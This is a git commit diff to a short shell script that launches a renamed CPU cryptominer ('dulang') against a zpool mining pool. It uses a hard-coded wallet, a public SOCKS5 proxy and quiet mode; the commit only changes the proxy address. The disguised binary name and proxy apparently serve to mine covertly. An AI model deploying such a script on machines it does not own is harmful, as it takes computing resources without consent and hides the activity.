cf1525c5352ad7a78329c1574d1f5b8294974a7e
xfdbtry5e <86540555+xfdbtry5e@users.noreply.github.com>
2021-06-27 08:40:12 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
 WALLET=CXLyeasEvrdrr99WdeKmeYcnDaTkAqcEAx
-PROXY=socks5://154.16.63.16:1080
+PROXY=socks5://72.195.34.41:4145
 ./dulang -a cpupower -o $POOL -u $WALLET -p c=CPU,zap=CPU -x $PROXY -q
